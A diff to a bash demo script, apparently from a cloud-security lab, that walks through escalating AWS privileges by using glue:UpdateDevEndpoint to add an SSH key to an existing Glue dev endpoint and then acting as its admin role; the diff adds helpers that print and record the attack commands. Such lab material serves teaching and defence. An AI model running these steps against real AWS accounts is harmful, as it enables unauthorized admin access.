@@ -3,7 +3,9 @@
 # Demo script for glue:UpdateDevEndpoint privilege escalation
 # This script demonstrates how a user with UpdateDevEndpoint can add SSH key to existing endpoint
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -11,6 +13,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-glue-002-to-admin-starting-user"
@@ -83,6 +103,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -94,6 +115,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -101,6 +123,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify lack of admin permissions
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -112,6 +135,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Discovering existing Glue dev endpoint${NC}"
 echo "Listing Glue dev endpoints..."
 
+show_cmd "aws glue get-dev-endpoint --region \"$AWS_REGION\" --endpoint-name \"$DEV_ENDPOINT_NAME\" --query 'DevEndpoint.[EndpointName,Status,RoleArn]' --output text"
 ENDPOINT_INFO=$(aws glue get-dev-endpoint \
     --region "$AWS_REGION" \
     --endpoint-name "$DEV_ENDPOINT_NAME" \
@@ -160,6 +184,7 @@ echo "This is the privilege escalation vector - adding our SSH key to the endpoi
 echo "Endpoint: $DEV_ENDPOINT_NAME"
 echo ""
 
+show_attack_cmd "aws glue update-dev-endpoint --region \"$AWS_REGION\" --endpoint-name \"$DEV_ENDPOINT_NAME\" --add-public-keys \"$SSH_PUBLIC_KEY\" --output json"
 aws glue update-dev-endpoint \
     --region "$AWS_REGION" \
     --endpoint-name "$DEV_ENDPOINT_NAME" \
@@ -183,6 +208,7 @@ echo -e "${GREEN}✓ Update propagated${NC}\n"
 
 # Step 9: Get endpoint address
 echo -e "${YELLOW}Step 9: Retrieving dev endpoint connection details${NC}"
+show_cmd "aws glue get-dev-endpoint --region \"$AWS_REGION\" --endpoint-name \"$DEV_ENDPOINT_NAME\" --query 'DevEndpoint.PublicAddress' --output text"
 ENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \
     --region "$AWS_REGION" \
     --endpoint-name "$DEV_ENDPOINT_NAME" \
@@ -261,6 +287,13 @@ echo -e "  $STARTING_USER"
 echo -e "  → (glue:UpdateDevEndpoint) → Add SSH key to existing endpoint"
 echo -e "  → (SSH Access) → Execute AWS commands as $TARGET_ROLE_NAME"
 echo -e "  → Admin Access"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo -e "\n${YELLOW}Key Difference from glue:CreateDevEndpoint:${NC}"
 echo "- UpdateDevEndpoint: Modifies existing endpoint (faster, no provisioning wait)"
